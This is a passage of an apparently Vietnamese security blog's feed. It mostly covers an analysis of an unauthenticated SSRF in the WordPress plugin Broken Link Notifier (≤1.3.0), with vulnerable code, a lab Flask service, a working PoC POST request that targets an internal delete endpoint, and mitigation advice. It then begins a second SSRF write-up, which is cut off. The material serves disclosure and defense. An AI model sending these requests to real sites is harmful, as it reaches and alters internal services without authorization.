gốc&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Cuối cùng trả về mảng này để plugin sử dụng hiển thị trạng thái URL.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;details admonition bug open&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Lỗi&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;Hàm này chỉ gửi request đến URL và trả về trạng thái của URL đó, không lấy hoặc trả về nội dung file. Vấn đề SSRF xuất hiện khi attacker cung cấp URL trỏ tới các dịch vụ nội bộ — server sẽ thực hiện request thay cho attacker, có thể gây ra các hành động như thay đổi dữ liệu, xóa dữ liệu, quét/kiểm tra cổng nội bộ hoặc gọi các endpoint nhạy cảm. Hàm không cho phép đọc trực tiếp nội dung file trả về, nhưng việc thực hiện request đến các internal service vẫn đủ để gây tổn hại.&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&lt;p&gt;&lt;code&gt;check_url_status_code()&lt;/code&gt; được gọi bên trong hàm &lt;code&gt;check_link()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function check_link( $link ) {&#xA;    ...&#xA;    // Handle the filtered link if false&#xA;    if ( !$link ) {&#xA;    ...&#xA;    } elseif ( str_starts_with( $link, home_url() ) || ( str_starts_with( $link, &amp;#39;/&amp;#39; ) &amp;amp;&amp;amp; !str_starts_with( $link, &amp;#39;//&amp;#39; ) ) ) {&#xA;        &#xA;        // Check locally first&#xA;        if ( !url_to_postid( $link ) ) {                &#xA;&#xA;            // It may be redirected or an archive page, so let&amp;#39;s check status anyway&#xA;            // return $this-&amp;gt;check_url_status_code( $link );&#xA;            $status = $this-&amp;gt;check_url_status_code( $link );&#xA;            $CACHE-&amp;gt;set_cached_link( $status );&#xA;            return $status;&#xA;        }&#xA;    // Otherwise&#xA;    } else {&#xA;        // Skip url schemes&#xA;        foreach ( $this-&amp;gt;get_url_schemes() as $scheme ) {&#xA;            if ( str_starts_with( $link, $scheme.&amp;#39;:&amp;#39; ) ) {&#xA;                $status[ &amp;#39;text&amp;#39; ] = &amp;#39;Skipping: Non-Http URL Schema&amp;#39;;&#xA;                return $status;&#xA;            }&#xA;        }&#xA;&#xA;        // Return the status&#xA;        // return $this-&amp;gt;check_url_status_code( $link );&#xA;        $status = $this-&amp;gt;check_url_status_code( $link );&#xA;        $CACHE-&amp;gt;set_cached_link( $status );&#xA;        return $status;&#xA;    }&#xA;&#xA;    // Return the good status&#xA;    return $status;&#xA;} // End check_link()&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;check_link()&lt;/code&gt; kiểm tra URL trước khi gọi &lt;code&gt;check_url_status_code()&lt;/code&gt;. Nếu link là nội bộ nhưng không trỏ tới post hợp lệ (&lt;code&gt;elseif&lt;/code&gt;), hoặc là link ngoài site hợp lệ(&lt;code&gt;else&lt;/code&gt;), hàm sẽ gọi &lt;code&gt;check_url_status_code()&lt;/code&gt; để lấy trạng thái (&lt;code&gt;good&lt;/code&gt;, &lt;code&gt;warning&lt;/code&gt;, &lt;code&gt;broken&lt;/code&gt;) và lưu cache. Link trống, không hợp lệ, hoặc có scheme không hỗ trợ sẽ bị bỏ qua mà không gửi request.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;check_link()&lt;/code&gt; được gọi bên trong hàm &lt;code&gt;ajax_blinks()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function ajax_blinks() {&#xA;    // Verify nonce&#xA;    if ( !isset( $_REQUEST[ &amp;#39;nonce&amp;#39; ] ) || !wp_verify_nonce( sanitize_text_field( wp_unslash( $_REQUEST[ &amp;#39;nonce&amp;#39; ] ) ), $this-&amp;gt;nonce_blinks ) ) {&#xA;        exit( &amp;#39;No naughty business please.&amp;#39; );&#xA;    }&#xA;&#xA;    // Get the ID&#xA;    $source_url    = isset( $_REQUEST[ &amp;#39;source_url&amp;#39; ] ) ? filter_var( wp_unslash( $_REQUEST[ &amp;#39;source_url&amp;#39; ] ), FILTER_SANITIZE_URL ) : &amp;#39;&amp;#39;;&#xA;    $header_links  = isset( $_REQUEST[ &amp;#39;header_links&amp;#39; ] ) ? wp_unslash( $_REQUEST[ &amp;#39;header_links&amp;#39; ] ) : []; // phpcs:ignore WordPress.Security.&#xA;    ...&#xA;&#xA;    // Make sure we have a source URL&#xA;    if ( $source_url ) {&#xA;&#xA;        // Only allow webpages, not file:///, etc.&#xA;        if ( !str_starts_with( $source_url, &amp;#39;http&amp;#39; ) ) {&#xA;            wp_send_json_error( &amp;#39;Invalid source: &amp;#39; . $source_url );&#xA;        }&#xA;&#xA;        // Header links&#xA;        if ( !empty( $header_links ) ) {&#xA;            foreach ( $header_links as &amp;amp;$header_link ) {&#xA;                $count_links&amp;#43;&amp;#43;;&#xA;                $header_link = $HELPERS-&amp;gt;sanitize_link( $header_link );&#xA;                $status = $HELPERS-&amp;gt;check_link( $header_link );&#xA;                if ( in_array( $status[ &amp;#39;code&amp;#39; ], $notify_status_codes ) ) {&#xA;                    $count_notify&amp;#43;&amp;#43;;&#xA;                    $notify[ &amp;#39;header&amp;#39; ][] = $status;&#xA;                } else {&#xA;                    $good_links[ &amp;#39;header&amp;#39; ][] = $status;&#xA;                }&#xA;            }&#xA;        }&#xA;        ...&#xA;    } &#xA;    ...&#xA;} // End ajax_blinks()&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm này được đăng ký làm callback cho action hook với hook name là &lt;code&gt;wp_ajax_nopriv_blnotifier_blinks&lt;/code&gt; dành cho &lt;strong&gt;anonymous user&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;private $ajax_key_blinks = &amp;#39;blnotifier_blinks&amp;#39;;&#xA;add_action( &amp;#39;wp_ajax_nopriv_&amp;#39;.$this-&amp;gt;ajax_key_blinks, [ $this, &amp;#39;ajax_blinks&amp;#39; ] );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sau đó thực hiện các chức năng sau:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Check &lt;code&gt;nonce&lt;/code&gt; để chống CSRF&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Ghi chú&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Vì hook này dành cho &lt;strong&gt;anonymous user&lt;/strong&gt; nên &lt;code&gt;nonce&lt;/code&gt; cũng sẽ xuất hiện trong mã nguồn trang chủ trả về.&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-28-cve-2025-6851/nonce.png&#34; title=&#34;Nonce trong mã nguồn trả về&#34; data-thumbnail=&#34;/posts/2025-10-28-cve-2025-6851/nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Nonce&lt;/h2&gt;&lt;p&gt;Nonce trong mã nguồn trả về&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-28-cve-2025-6851/nonce.png&#39; alt=&#34;Nonce&#34; height=&#34;439&#34; width=&#34;1543&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nonce trong mã nguồn trả về&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Lấy dữ liệu từ request&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Lấy &lt;code&gt;source_url&lt;/code&gt; và các link từ &lt;code&gt;header_links&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Chỉ chấp nhận &lt;code&gt;source_url&lt;/code&gt; bắt đầu bằng &lt;code&gt;http&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Duyệt từng &lt;code&gt;header_links&lt;/code&gt; link và gọi &lt;code&gt;check_link()&lt;/code&gt; để kiểm tra trạng thái&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;code&gt;header_links&lt;/code&gt; được truyền vào ở dạng mảng: &lt;code&gt;header_link[0]=http://example.com&lt;/code&gt;&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;graph LR&#xA;    A[Anonymous Client gửi URL] --&amp;gt; B[ajax_blinks]&#xA;    B --&amp;gt; C[check_link]&#xA;    C --&amp;gt; D[check_url_status_code]&#xA;    D --&amp;gt; E[wp_remote_get với URL user cung cấp]&#xA;    E --&amp;gt; F[Response từ server]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;local-server&#34;&gt;&lt;span&gt;Local Server&lt;/span&gt;&#xA;  &lt;a href=&#34;#local-server&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Tạo local service đơn giản bằng python&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;from flask import Flask, request&#xA;import os&#xA;&#xA;BASE_DIR = os.path.abspath(os.getcwd())&#xA;app = Flask(__name__)&#xA;&#xA;@app.route(&amp;#39;/delete&amp;#39;, methods=[&amp;#39;GET&amp;#39;])&#xA;def delete():&#xA;    file_id = request.args.get(&amp;#39;id&amp;#39;)&#xA;    if not file_id:&#xA;        return &amp;#34;No id provided&amp;#34;, 400&#xA;    print(f&amp;#34;delete it: {file_id}&amp;#34;)&#xA;    return f&amp;#34;Delete it: {file_id}&amp;#34;&#xA;&#xA;if __name__ == &amp;#39;__main__&amp;#39;:&#xA;    app.run(host=&amp;#39;0.0.0.0&amp;#39;, port=8001, debug=True)&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Truy cập trang chủ và lấy &lt;code&gt;nonce&lt;/code&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Gửi POST request đến endpoint&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;&#xA;action=blnotifier_blinks&amp;amp;nonce=87f4d1ef16&amp;amp;source_url=http://localhost:8001/&amp;amp;header_links[0]=http://127.0.0.1:8001/delete?id=1&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-28-cve-2025-6851/result.png&#34; title=&#34;Gửi thành công request tới local service&#34; data-thumbnail=&#34;/posts/2025-10-28-cve-2025-6851/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Gửi thành công request tới local service&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-28-cve-2025-6851/result.png&#39; alt=&#34;Result&#34; height=&#34;269&#34; width=&#34;966&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Gửi thành công request tới local service&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Phiên bản &lt;strong&gt;≤1.3.0&lt;/strong&gt; của Broken Link Notifier có lỗ hổng &lt;strong&gt;SSRF&lt;/strong&gt;: endpoint cho phép anonymous truyền URL, dẫn đến &lt;code&gt;wp_remote_get()&lt;/code&gt; gọi tới dịch vụ nội bộ. Bản &lt;strong&gt;1.3.1&lt;/strong&gt; đã thêm kiểm tra DNS/IP và giới hạn quyền, ngăn chặn SSRF trước khi thực hiện request.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Nâng cấp ngay&lt;/strong&gt; lên &lt;strong&gt;≥1.3.1&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Không tin URL từ client&lt;/strong&gt; — validate/allowlist trước khi fetch.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Chặn IP nội bộ&lt;/strong&gt; (resolve DNS, block private/reserved).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Giới hạn quyền&lt;/strong&gt; endpoint (không cho anonymous).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Trả status thay vì body thô&lt;/strong&gt; khi không cần nội dung.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SSRF (Server Side Request Forgery) — Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/broken-link-notifier/vulnerability/wordpress-broken-link-notifier-plugin-1-3-0-unauthenticated-server-side-request-forgery-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Broken Link Notifier Plugin &amp;lt;= 1.3.0 is vulnerable to Server Side Request Forgery (SSRF) &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-10861 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-27-cve-2025-10861/</link>
      <pubDate>Mon, 27 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-27-cve-2025-10861/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-27-cve-2025-10861/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Popup Builder with Gamification, Multi-Step Popups, Page-Level Targeting, and WooCommerce Triggers&lt;/strong&gt; cho WordPress tồn tại lỗ hổng &lt;strong&gt;Server-Side Request Forgery (SSRF)&lt;/strong&gt; trong tất cả các phiên bản &lt;strong&gt;từ đầu đến 2.1.4 (bao gồm cả 2.1.4)&lt;/strong&gt;.&#xA;Nguyên nhân là do &lt;strong&gt;thiếu kiểm tra hợp lệ (insufficient validation)&lt;/strong&gt; đối với các &lt;strong&gt;URL&lt;/strong&gt; được truyền thông qua tham số &lt;strong&gt;&lt;code&gt;URL&lt;/code&gt;&lt;/strong&gt;.&#xA;Điều này cho phép &lt;strong&gt;kẻ tấn công chưa xác thực (unauthenticated attackers)&lt;/strong&gt; gửi các &lt;strong&gt;web request&lt;/strong&gt; đến &lt;strong&gt;địa chỉ tùy ý&lt;/strong&gt; xuất phát từ ứng dụng web, có thể được lợi dụng để &lt;strong&gt;truy vấn hoặc chỉnh sửa thông tin từ các dịch vụ nội bộ (internal services)&lt;/strong&gt;, cũng như &lt;strong&gt;thực hiện hoạt động trinh sát mạng (network reconnaissance)&lt;/strong&gt;.&#xA;Lỗ hổng này đã được &lt;strong&gt;vá một phần (partially patched)&lt;/strong&gt; trong &lt;strong&gt;phiên bản 2.1.4&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-10861&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-10861&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Server Side Request Forgery (SSRF)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.1.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.1.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (7.2)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/popup-builder-block/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress PopupKit Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 